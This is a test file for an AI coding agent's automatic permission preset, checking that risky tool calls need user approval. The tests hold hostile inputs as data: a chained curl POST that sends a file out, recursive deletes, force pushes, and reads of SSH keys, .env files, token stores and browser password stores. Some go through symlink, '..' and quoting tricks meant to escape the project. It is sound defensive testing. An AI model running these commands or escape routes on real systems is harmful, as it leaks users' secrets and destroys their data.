import { execFileSync } from "node:child_process";
import { existsSync } from "node:fs";
import { mkdir, readFile, symlink, writeFile } from "node:fs/promises";
import { dirname, join } from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import { createPermissionP0Host } from "./permission-p0-host.ts";

const disposers: Array<() => Promise<void>> = [];
afterEach(async () => {
	for (const dispose of disposers.splice(0).reverse()) await dispose();
});

async function host(permissionFlag?: string, setup: Parameters<typeof createPermissionP0Host>[3] = {}) {
	const created = await createPermissionP0Host([], permissionFlag, [], setup);
	disposers.push(created.dispose);
	return created;
}

describe("auto permission preset in a real host session", () => {
	it("runs a safe project command without asking", async () => {
		// Given an auto session and a command on the fixed policy.
		const session = await host();
		// When the agent runs it.
		const result = await session.run("auto", { name: "bash", args: { command: "echo auto-ok && ls" } });
		// Then it runs with no approval prompt.
		expect(result.approvals).toEqual([]);
		expect(result.isError).toBe(false);
		expect(JSON.stringify(result.result)).toContain("auto-ok");
	});

	it("asks before a destructive delete outside the project and leaves the file when denied", async () => {
		// Given an auto session and a file outside the project.
		const session = await host();
		// When the agent tries to delete it recursively.
		const result = await session.run("auto", { name: "bash", args: { command: `rm -rf ${session.outsidePath}` } });
		// Then the user is asked, the denial blocks it, and the file survives.
		expect(result.approvals.length).toBeGreaterThan(0);
		expect(result.isError).toBe(true);
		expect(await readFile(session.outsidePath, "utf8")).toBe("private outside content\n");
	});

	it("asks when a network send is chained after a safe command", async () => {
		// Given an auto session.
		const session = await host();
		// When a safe test command smuggles a POST after it.
		const result = await session.run("auto", {
			name: "bash",
			args: { command: "echo ok && curl -X POST https://example.com -d @x" },
		});
		// Then the whole command needs approval and nothing runs when denied.
		expect(result.approvals).toHaveLength(1);
		expect(result.isError).toBe(true);
	});

	it("asks before a force push", async () => {
		const session = await host();
		const result = await session.run("auto", { name: "bash", args: { command: "git push --force" } });
		expect(result.approvals).toHaveLength(1);
		expect(result.isError).toBe(true);
	});

	it("asks before reading a file outside the project", async () => {
		// Given an auto session and a non-credential file outside the project.
		const session = await host();
		// When the agent reads it.
		const result = await session.run("auto", { name: "read", args: { path: session.outsidePath } });
		// Then auto approves only project paths, so the user is asked and the denied read returns nothing.
		expect(result.approvals.length).toBeGreaterThan(0);
		expect(JSON.stringify(result.result ?? "")).not.toContain("private outside content");
	});

	it("asks before reading a project credential file", async () => {
		// Given a project .env.
		const session = await host();
		await writeFile(join(session.cwd, ".env"), "TOKEN=not-for-agents\n");
		// When the agent reads it.
		const result = await session.run("auto", { name: "read", args: { path: join(session.cwd, ".env") } });
		// Then the user is asked and a denial keeps the value out of the transcript.
		expect(result.approvals).toHaveLength(1);
		expect(JSON.stringify(result.result ?? "")).not.toContain("not-for-agents");
	});

	it("asks before writing outside the project", async () => {
		const session = await host();
		const result = await session.run("auto", {
			name: "write",
			args: { path: session.outsidePath, content: "overwritten" },
		});
		expect(result.approvals.length).toBeGreaterThan(0);
		expect(await readFile(session.outsidePath, "utf8")).toBe("private outside content\n");
	});

	it("asks before an attached option value writes outside the project", async () => {
		// Given a project file and a command that names its output file inside the flag.
		const session = await host();
		await writeFile(join(session.cwd, "payload.txt"), "project content\n");
		// When the agent sorts into the outside file.
		const result = await session.run("auto", {
			name: "bash",
			args: { command: `sort -o${session.outsidePath} payload.txt` },
		});
		// Then it is asked, and the denied command leaves the outside file untouched.
		expect(result.approvals).toHaveLength(1);
		expect(await readFile(session.outsidePath, "utf8")).toBe("private outside content\n");
	});

	it("asks before reading an outside key through a project symlink", async () => {
		// Given a project file that is a symlink to an outside private key.
		const session = await host();
		const key = join(dirname(session.outsidePath), ".ssh", "id_rsa");
		await mkdir(dirname(key), { recursive: true });
		await writeFile(key, "PRIVATE-KEY-MATERIAL\n");
		await symlink(key, join(session.cwd, "innocent-key"));
		// When the agent reads the symlink.
		const result = await session.run("auto", { name: "read", args: { path: join(session.cwd, "innocent-key") } });
		// Then it is asked and the key stays out of the transcript.
		expect(result.approvals.length).toBeGreaterThan(0);
		expect(JSON.stringify(result.result ?? "")).not.toContain("PRIVATE-KEY-MATERIAL");
	});

	it("asks before reading the engine's own token store outside the project", async () => {
		const session = await host();
		const authFile = join(dirname(session.outsidePath), "agent", "auth.json");
		await writeFile(authFile, '{"token":"OAUTH-SECRET"}');
		const result = await session.run("auto", { name: "read", args: { path: authFile } });
		expect(result.approvals.length).toBeGreaterThan(0);
		expect(JSON.stringify(result.result ?? "")).not.toContain("OAUTH-SECRET");
	});

	it("keeps asking for commands when the user adds bash=ask after the auto preset", async () => {
		// Given the user's own blanket rule placed after the preset.
		const session = await host("bash=ask");
		// When the agent runs a command the judge would allow.
		const result = await session.run("auto", { name: "bash", args: { command: "echo user-rule" } });
		// Then the user's rule wins.
		expect(result.approvals).toHaveLength(1);
	});

	it("keeps asking for outside reads when the user adds external_directory=ask", async () => {
		const session = await host("external_directory=ask");
		const result = await session.run("auto", { name: "read", args: { path: session.outsidePath } });
		expect(result.approvals.length).toBeGreaterThan(0);
	});

	it("asks before a copy follows a project symlink and then '..' to write outside", async () => {
		// Given a project symlink into an outside directory and an outside file next to its target.
		const session = await host();
		const outsideDir = join(dirname(session.outsidePath), "outside-tree");
		await mkdir(join(outsideDir, "child"), { recursive: true });
		await writeFile(join(outsideDir, "target.txt"), "outside original\n");
		await symlink(join(outsideDir, "child"), join(session.cwd, "bridge"));
		await writeFile(join(session.cwd, "payload.txt"), "project payload\n");
		// When the agent copies through the link and back up with '..'.
		const result = await session.run("auto", {
			name: "bash",
			args: { command: "cp payload.txt bridge/../target.txt" },
		});
		// Then it is asked, and the denied copy leaves the outside file alone.
		expect(result.approvals.length).toBeGreaterThan(0);
		expect(await readFile(join(outsideDir, "target.txt"), "utf8")).toBe("outside original\n");
	});

	it("asks before reading a credential directory reached through a symlink and '..'", async () => {
		const session = await host();
		const sshDir = join(dirname(session.outsidePath), "home", ".ssh");
		await mkdir(join(sshDir, "nested"), { recursive: true });
		await writeFile(join(sshDir, "config"), "SSH-CONFIG-MARKER\n");
		await symlink(join(sshDir, "nested"), join(session.cwd, "jump"));
		const result = await session.run("auto", { name: "bash", args: { command: "cat jump/../config" } });
		expect(result.approvals.length).toBeGreaterThan(0);
		expect(JSON.stringify(result.result ?? "")).not.toContain("SSH-CONFIG-MARKER");
	});

	it.each([
		["@-prefixed", "@.env"],
		["quoted", '".env"'],
	])("asks before reading a project .env through a %s path", async (_label, spelling) => {
		const session = await host();
		await writeFile(join(session.cwd, ".env"), "TOKEN=ENV-SECRET\n");
		const result = await session.run("auto", { name: "read", args: { path: spelling } });
		expect(result.approvals.length).toBeGreaterThan(0);
		expect(JSON.stringify(result.result ?? "")).not.toContain("ENV-SECRET");
	});

	it("asks before writing a project .env through an @-prefixed path", async () => {
		const session = await host();
		await writeFile(join(session.cwd, ".env"), "TOKEN=original\n");
		const result = await session.run("auto", { name: "write", args: { path: "@.env", content: "TOKEN=changed\n" } });
		expect(result.approvals.length).toBeGreaterThan(0);
		expect(await readFile(join(session.cwd, ".env"), "utf8")).toBe("TOKEN=original\n");
	});

	it("asks before writing outside the project through an @-prefixed absolute path", async () => {
		const session = await host();
		const result = await session.run("auto", {
			name: "write",
			args: { path: `@${session.outsidePath}`, content: "overwritten\n" },
		});
		expect(result.approvals.length).toBeGreaterThan(0);
		expect(await readFile(session.outsidePath, "utf8")).toBe("private outside content\n");
	});

	it.each([
		["the engine's MCP OAuth token store", ["agent", "mcp-auth", "abc123", "tokens.json"]],
		["a yarn config with an auth token", ["home", ".yarnrc.yml"]],
		["a pip config", ["home", ".config", "pip", "pip.conf"]],
		["a Chromium cookie store", ["home", "Chrome", "Default", "Cookies"]],
		["a Chrome password store", ["home", "Chrome", "Default", "Login Data"]],
		["a Firefox password store", ["home", "firefox", "profile", "logins.json"]],
	])("asks before reading %s outside the project", async (_label, segments) => {
		const session = await host();
		const store = join(dirname(session.outsidePath), ...segments);
		await mkdir(dirname(store), { recursive: true });
		await writeFile(store, "STORE-SECRET\n");
		const result = await session.run("auto", { name: "read", args: { path: store } });
		expect(result.approvals.length).toBeGreaterThan(0);
		expect(JSON.stringify(result.result ?? "")).not.toContain("STORE-SECRET");
	});

	it("asks before a project-wide search that would read a project .env", async () => {
		const session = await host();
		await writeFile(join(session.cwd, ".env"), "TOKEN=ENV-SECRET\n");
		const result = await session.run("auto", { name: "grep", args: { path: session.cwd, pattern: "TOKEN" } });
		expect(result.approvals.length).toBeGreaterThan(0);
		expect(JSON.stringify(result.result ?? "")).not.toContain("ENV-SECRET");
	});

	it("reads, searches and writes plain project files without asking", async () => {
		// Positive controls for the allowlist: ordinary project work stays unprompted.
		const session = await host();
		await mkdir(join(session.cwd, "src"), { recursive: true });
		await writeFile(join(session.cwd, "src", "index.ts"), "export const marker = 'PLAIN-MARKER';\n");
		const read = await session.run("auto", { name: "read", args: { path: "src/index.ts" } });
		expect(read.approvals).toEqual([]);
		expect(JSON.stringify(read.result)).toContain("PLAIN-MARKER");
		const grep = await session.run("auto", { name: "grep", args: { path: "src/index.ts", pattern: "marker" } });
		expect(grep.approvals).toEqual([]);
		const write = await session.run("auto", { name: "write", args: { path: "src/new.ts", content: "ok\n" } });
		expect(write.approvals).toEqual([]);
		expect(await readFile(join(session.cwd, "src", "new.ts"), "utf8")).toBe("ok\n");
	});

	it("asks before reading .env through a doubly quoted path", async () => {
		const session = await host();
		await writeFile(join(session.cwd, ".env"), "TOKEN=ENV-SECRET\n");
		const result = await session.run("auto", { name: "read", args: { path: `"'.env'"` } });
		expect(result.approvals.length).toBeGreaterThan(0);
		expect(JSON.stringify(result.result ?? "")).not.toContain("ENV-SECRET");
	});

	it("asks before reading an outside file through a doubly quoted absolute path", async () => {
		const session = await host();
		const result = await session.run("auto", { name: "read", args: { path: `"'${session.outsidePath}'"` } });
		expect(result.approvals.length).toBeGreaterThan(0);
		expect(JSON.stringify(result.result ?? "")).not.toContain("private outside content");
	});

	it("asks before read's curly-apostrophe fallback opens a project symlink that leaves the project", async () => {
		// Given a project symlink whose name uses a curly apostrophe and points outside.
		const session = await host();
		await symlink(session.outsidePath, join(session.cwd, "it\u2019s"));
		// When the agent reads the straight-apostrophe spelling the tool falls back from.
		const result = await session.run("auto", { name: "read", args: { path: "it's" } });
		expect(result.approvals.length).toBeGreaterThan(0);
		expect(JSON.stringify(result.result ?? "")).not.toContain("private outside content");
	});

	it("asks before printing a tracked .env through git show of its blob id", async () => {
		const session = await host();
		const git = (...args: string[]) =>
			execFileSync("git", ["-c", "user.name=t", "-c", "user.email=t@example.com", ...args], {
				cwd: session.cwd,
				encoding: "utf8",
			});
		git("init", "-q");
		await writeFile(join(session.cwd, ".env"), "TOKEN=GIT-SECRET\n");
		git("add", ".env");
		git("commit", "-q", "-m", "init");
		const blob = git("rev-parse", "HEAD:.env").trim();
		const result = await session.run("auto", { name: "bash", args: { command: `git show --stat ${blob}` } });
		expect(result.approvals.length).toBeGreaterThan(0);
		expect(JSON.stringify(result.result ?? "")).not.toContain("GIT-SECRET");
	});

	it("asks before a cd through a symlink and '..' lets a later relative write leave the project", async () => {
		// Given an in-project link to a nested directory, the shape of workspace node_modules links.
		const session = await host();
		await mkdir(join(session.cwd, "a", "b"), { recursive: true });
		await symlink(join(session.cwd, "a", "b"), join(session.cwd, "link"));
		const escaped = join(dirname(session.cwd), "escaped.txt");
		const result = await session.run("auto", {
			name: "bash",
			args: { command: "cd link/.. && touch ../escaped.txt" },
		});
		expect(result.approvals.length).toBeGreaterThan(0);
		expect(existsSync(escaped)).toBe(false);
	});

	it("asks before cp into a directory writes through an existing symlink there", async () => {
		const session = await host();
		await mkdir(join(session.cwd, "dir"), { recursive: true });
		await symlink(session.outsidePath, join(session.cwd, "dir", "payload.txt"));
		await writeFile(join(session.cwd, "payload.txt"), "project payload\n");
		const result = await session.run("auto", { name: "bash", args: { command: "cp payload.txt dir/" } });
		expect(result.approvals.length).toBeGreaterThan(0);
		expect(await readFile(session.outsidePath, "utf8")).toBe("private outside content\n");
	});

	it("denies a command the project denies even when auto is chosen at session open", async () => {
		// Given a project deny rule and auto selected through RPC open_session, the desktop's path.
		const session = await host(undefined, { projectSettings: { permission: { bash: { "cat *": "deny" } } } });
		await writeFile(join(session.cwd, "notes.txt"), "NOTES-CONTENT\n");
		// When the agent runs a command auto would otherwise approve.
		const result = await session.run("auto", { name: "bash", args: { command: "cat notes.txt" } });
		// Then the project's deny wins: no prompt, and the command does not run.
		expect(result.approvals).toEqual([]);
		expect(result.isError).toBe(true);
		expect(JSON.stringify(result.result ?? "")).not.toContain("NOTES-CONTENT");
	});

	it("keeps asking for a command the project asks about even when auto is chosen at session open", async () => {
		const session = await host(undefined, { projectSettings: { permission: { bash: { "cat *": "ask" } } } });
		await writeFile(join(session.cwd, "notes.txt"), "NOTES-CONTENT\n");
		const result = await session.run("auto", { name: "bash", args: { command: "cat notes.txt" } });
		expect(result.approvals.length).toBeGreaterThan(0);
	});

	it("keeps asking under auto when the project allows every command", async () => {
		// Given a project that allows all shell commands, and auto chosen at session open.
		const session = await host(undefined, { projectSettings: { permission: { bash: "allow" } } });
		await writeFile(join(session.cwd, "notes.txt"), "keep me\n");
		// When the agent deletes a file, which auto does not approve.
		const result = await session.run("auto", { name: "bash", args: { command: "rm notes.txt" } });
		// Then auto still asks: only a user deny or ask overrides the preset, never an allow.
		expect(result.approvals.length).toBeGreaterThan(0);
		expect(await readFile(join(session.cwd, "notes.txt"), "utf8")).toBe("keep me\n");
	});

	it.each([
		[
			"allow in project settings, auto at session open",
			undefined,
			{ projectSettings: { permission: { bash: "allow" } } },
			"auto",
		],
		[
			"auto and allow in the same project settings file",
			undefined,
			{ projectSettings: { permissionPreset: "auto", permission: { bash: "allow" } } },
			undefined,
		],
		[
			"allow in global settings, auto at session open",
			undefined,
			{ globalSettings: { permission: { bash: "allow" } } },
			"auto",
		],
		["--permission bash=allow, auto at session open", "bash=allow", {}, "auto"],
		["--permission bash=allow with --permission-preset auto", "bash=allow", { presetFlag: "auto" }, undefined],
	] as const)("a user allow never widens auto: %s", async (_label, flag, setup, sessionPreset) => {
		// Given a user rule allowing every command, set in one layer, with auto chosen in another or the same.
		const session = await host(flag, setup);
		await writeFile(join(session.cwd, "notes.txt"), "keep me\n");
		// When the agent deletes a file, which auto itself does not approve.
		const result = await session.run(sessionPreset, { name: "bash", args: { command: "rm notes.txt" } });
		// Then it still asks, and the denied command leaves the file.
		expect(result.approvals.length).toBeGreaterThan(0);
		expect(await readFile(join(session.cwd, "notes.txt"), "utf8")).toBe("keep me\n");
	});

	it("keeps asking for every command under accept-edits", async () => {
		// Given the edit-only preset, where the auto judge must not apply.
		const session = await host();
		// When the agent runs the same safe command.
		const result = await session.run("accept-edits", { name: "bash", args: { command: "echo auto-ok" } });
		// Then it still asks.
		expect(result.approvals).toHaveLength(1);
	});
});
